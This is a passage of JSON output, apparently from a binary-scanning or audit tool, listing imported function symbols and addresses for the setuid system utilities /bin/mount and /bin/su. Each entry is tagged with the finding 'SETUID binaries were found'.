                        "/bin/mount",
                        "0x0000dbe8",
                        "mnt_context_is_fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbf0",
                        "strtod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbf8",
                        "mnt_table_next_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc00",
                        "localeconv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc08",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc10",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc18",
                        "mnt_new_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc20",
                        "mnt_context_get_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc28",
                        "mnt_context_set_target_prefix",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc30",
                        "mnt_context_disable_swapmatch",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc38",
                        "__strtol_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc40",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc48",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc50",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc58",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc60",
                        "mnt_get_library_features",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc68",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc70",
                        "mnt_cache_find_tag_value",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc78",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc80",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc88",
                        "errx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc90",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dc98",
                        "warnx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dca0",
                        "mnt_context_force_unrestricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dca8",
                        "nanosleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcb0",
                        "strrchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcb8",
                        "mnt_new_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcc0",
                        "mnt_context_next_mount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcc8",
                        "mnt_optstr_remove_option",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcd0",
                        "dup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcd8",
                        "mnt_context_enable_rwonly_mount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dce0",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dce8",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcf0",
                        "__strtoul_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dcf8",
                        "mnt_context_wait_for_children",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd00",
                        "memset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd08",
                        "mnt_context_disable_helpers",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd10",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd18",
                        "getcwd",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd20",
                        "mnt_context_get_options",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd28",
                        "fgetc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd30",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd38",
                        "mnt_context_set_tables_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd40",
                        "pipe",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd48",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd50",
                        "mnt_new_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd58",
                        "mnt_context_next_remount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd60",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd68",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd70",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd78",
                        "strndup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd80",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd88",
                        "mnt_fs_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd90",
                        "mnt_match_fstype",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dd98",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dda0",
                        "mnt_context_set_fstab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dda8",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddb0",
                        "mnt_fs_get_srcpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddb8",
                        "realpath",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddc0",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddc8",
                        "mnt_context_is_nocanonicalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddd0",
                        "prctl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddd8",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dde0",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dde8",
                        "mnt_context_enable_fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddf0",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ddf8",
                        "mnt_init_debug",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de00",
                        "mnt_context_syscall_called",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de08",
                        "err",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de10",
                        "mnt_context_set_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de18",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de20",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de28",
                        "mnt_new_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de30",
                        "mnt_context_get_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de38",
                        "mnt_fs_is_pseudofs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de40",
                        "mnt_context_get_excode",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de48",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de50",
                        "mnt_free_iter",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de58",
                        "mnt_context_is_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de60",
                        "mnt_context_set_target_ns",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de68",
                        "mnt_unref_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de70",
                        "mnt_fs_is_netfs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de78",
                        "getegid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de80",
                        "mnt_optstr_get_option",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de88",
                        "mnt_context_enable_sloppy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de90",
                        "mnt_table_set_cache",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000de98",
                        "mnt_context_set_mflags",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dea0",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dea8",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000deb0",
                        "mnt_context_get_mtab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000deb8",
                        "mnt_context_get_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dec0",
                        "mnt_get_library_version",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dec8",
                        "memmove",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ded0",
                        "mnt_context_is_parent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000ded8",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dee0",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dee8",
                        "access",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000def0",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000def8",
                        "mnt_pretty_path",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df00",
                        "mnt_context_set_options_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df08",
                        "mnt_free_context",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df10",
                        "mnt_context_disable_canonicalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df18",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df20",
                        "mnt_context_set_fstype_pattern",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df28",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df30",
                        "mnt_context_append_options",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df38",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df40",
                        "mnt_context_get_mflags",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df48",
                        "fwrite",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df50",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df58",
                        "mnt_context_enable_verbose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df60",
                        "mnt_context_set_optsmode",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df68",
                        "mnt_fs_get_options",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df70",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df78",
                        "mnt_table_parse_fstab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df80",
                        "mnt_context_disable_mtab",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df88",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df90",
                        "mnt_tag_is_valid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000df98",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfa0",
                        "mnt_fs_set_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfa8",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfb0",
                        "mnt_context_get_status",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfb8",
                        "_ITM_deregisterTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfc0",
                        "__libc_start_main",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfc8",
                        "__gmon_start__",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfd0",
                        "environ",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfd8",
                        "_ITM_registerTMCloneTable",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dfe0",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e020",
                        "__progname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e028",
                        "stdout",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e030",
                        "optind",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e040",
                        "optarg",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000e060",
                        "stderr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011b98",
                        "endgrent",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ba0",
                        "getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ba8",
                        "sigprocmask",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bb0",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bb8",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bc0",
                        "strcasecmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bc8",
                        "closelog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bd0",
                        "__vfprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bd8",
                        "abort",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011be0",
                        "pam_start",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011be8",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bf0",
                        "fdatasync",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011bf8",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c00",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c08",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c10",
                        "strcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c18",
                        "pam_set_item",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c20",
                        "warn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c28",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c30",
                        "isatty",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c38",
                        "sigaction",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c40",
                        "strtod",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c48",
                        "localeconv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c50",
                        "clock_gettime",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c58",
                        "setenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c60",
                        "write",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c68",
                        "getpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c70",
                        "textdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c78",
                        "__strtol_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c80",
                        "__open_2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c88",
                        "fclose",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c90",
                        "wait3",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011c98",
                        "getpwuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ca0",
                        "clearenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ca8",
                        "bindtextdomain",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cb0",
                        "stpcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cb8",
                        "pam_chauthtok",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cc0",
                        "dcgettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cc8",
                        "strlen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cd0",
                        "getpwuid_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cd8",
                        "pam_end",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ce0",
                        "chdir",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ce8",
                        "__stack_chk_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cf0",
                        "getuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011cf8",
                        "getopt_long",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d00",
                        "pam_strerror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d08",
                        "errx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d10",
                        "dup2",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d18",
                        "strchr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d20",
                        "warnx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d28",
                        "nanosleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d30",
                        "dup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d38",
                        "gettimeofday",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d40",
                        "pam_getenvlist",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d48",
                        "__assert_fail",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d50",
                        "fputs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d58",
                        "__strtoul_internal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d60",
                        "geteuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d68",
                        "setusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d70",
                        "signalfd",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d78",
                        "ioctl",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d80",
                        "updwtmpx",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d88",
                        "fgetc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d90",
                        "close",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011d98",
                        "setgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011da0",
                        "setsid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011da8",
                        "strspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011db0",
                        "misc_conv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011db8",
                        "fputc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dc0",
                        "strcspn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dc8",
                        "getusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dd0",
                        "read",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011dd8",
                        "strndup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011de0",
                        "fgets",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011de8",
                        "calloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011df0",
                        "putenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011df8",
                        "strcmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e00",
                        "sigemptyset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e08",
                        "basename",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e10",
                        "strtol",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e18",
                        "sigfillset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e20",
                        "memcpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e28",
                        "getgrnam",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e30",
                        "kill",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e38",
                        "openpty",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e40",
                        "fileno",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e48",
                        "getgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e50",
                        "__xstat",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e58",
                        "err",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e60",
                        "malloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e68",
                        "fflush",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e70",
                        "__vasprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e78",
                        "pam_close_session",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e80",
                        "getlogin",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e88",
                        "getegid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e90",
                        "setreuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011e98",
                        "strsignal",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ea0",
                        "ttyname",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ea8",
                        "setregid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011eb0",
                        "realloc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011eb8",
                        "cfmakeraw",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ec0",
                        "getpwnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ec8",
                        "setlocale",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ed0",
                        "__printf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ed8",
                        "poll",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ee0",
                        "__syslog_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ee8",
                        "setgid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ef0",
                        "waitpid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011ef8",
                        "tcgetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f00",
                        "tcsetattr",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f08",
                        "open",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f10",
                        "fopen",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f18",
                        "dcngettext",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f20",
                        "strtoul",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f28",
                        "execvp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f30",
                        "__cxa_atexit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f38",
                        "sysinfo",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f40",
                        "openlog",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f48",
                        "getgrnam_r",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f50",
                        "pam_acct_mgmt",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f58",
                        "exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f60",
                        "__fprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f68",
                        "setuid",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f70",
                        "strdup",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f78",
                        "pam_setcred",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f80",
                        "pam_authenticate",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f88",
                        "pam_open_session",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f90",
                        "initgroups",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011f98",
                        "sleep",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fa0",
                        "endusershell",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fa8",
                        "sigaddset",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fb0",
                        "execv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fb8",
                        "fork",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fc0",
                        "__ctype_b_loc",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/su",
                        "0x00011fc8",
                        "__sprintf_chk",
